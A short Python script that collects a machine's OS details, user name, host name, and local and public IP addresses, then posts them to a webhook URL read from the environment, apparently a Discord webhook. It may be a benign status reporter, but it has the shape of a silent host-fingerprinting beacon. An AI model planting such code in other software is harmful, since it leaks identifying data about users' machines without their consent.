import os
import requests
import dotenv
import sys
import socket
import platform

debug = True
def debug_print(content):
    if debug == True:
        print(content)

dotenv.load_dotenv()

def discord_post(content):
    data = {
        "content": content
    }
    url = os.getenv("URL")
    response = requests.post(url, json=data)
    debug_print(f"[Post] to {url}, {response.status_code}")

operating_system = platform.system()         # 'Windows', 'Linux', 'Darwin'
os_version = platform.release()               # '10', '11', '5.15.0-106'
cpu_architecture = platform.machine()         # 'x86_64', 'AMD64'
cpu_core_count = os.cpu_count()
current_user = os.getlogin()                  #ex. ben, admin
host_name = socket.gethostname()              #server1, cool-laptop
local_ip_address = socket.gethostbyname(host_name)
public_ip_address = requests.get('https://api.ipify.org').text

data = f"""
Operating System: {operating_system}
OS Version: {os_version}
Public IP: {public_ip_address}
Local IP (LAN): {local_ip_address}
Current User: {current_user}
Host Name: {host_name}
CPU Architecture: {cpu_architecture}
CPU Core Count: {cpu_core_count}
"""

discord_post(data.strip())